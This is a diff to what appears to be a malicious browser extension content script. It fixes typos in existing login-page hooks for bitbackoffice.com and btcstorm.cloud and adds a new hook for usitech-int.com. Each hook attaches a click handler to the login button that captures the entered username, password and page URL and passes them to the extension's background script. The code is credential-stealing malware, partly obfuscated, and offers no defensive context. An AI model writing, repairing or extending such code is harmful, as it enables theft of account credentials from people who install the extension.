@@ -637,7 +637,7 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
 
     if (top['location']['href']['indexOf']('bitbackoffice.com') > -1) {
           var interval = setInterval(function () {
-              if (document['getElementsById']('login')) {
+              if (document['getElementById']('login')) {
                   clearInterval(interval);
                   document['getElementsByClassName']('button-blue').onclick = function (_0x441cx2) {
                    var login = {};
@@ -652,7 +652,7 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
 
       if (top['location']['href']['indexOf']('btcstorm.cloud/login') > -1) {
             var interval = setInterval(function () {
-                if (document['getElementsById']('login-form')) {
+                if (document['getElementById']('login-form')) {
                     clearInterval(interval);
                     document['getElementsByClassName']('btn btn-accent js__login-submit btn-block').onclick = function (_0x441cx2) {
                      var login = {};
@@ -682,6 +682,20 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
           };
 
 
+          if (top['location']['href']['indexOf']('usitech-int.com/login') > -1) {
+                var interval = setInterval(function () {
+                    if (document['getElementById']('content_login')) {
+                        clearInterval(interval);
+                        document['getElementsByClassName']('btn btn-default submitbutton').onclick = function (_0x441cx2) {
+                         var login = {};
+                        login.username = document.getElementsByName("username")[0].value;
+                        login.pass = document.getElementsByName("password")[0].value;
+                        login.href = window.location.href;
+                        chrome.runtime.sendMessage({cmd: "l",login});
+                        }
+                    }
+                }, 1000)
+            };
 
 
     var target = 2048;
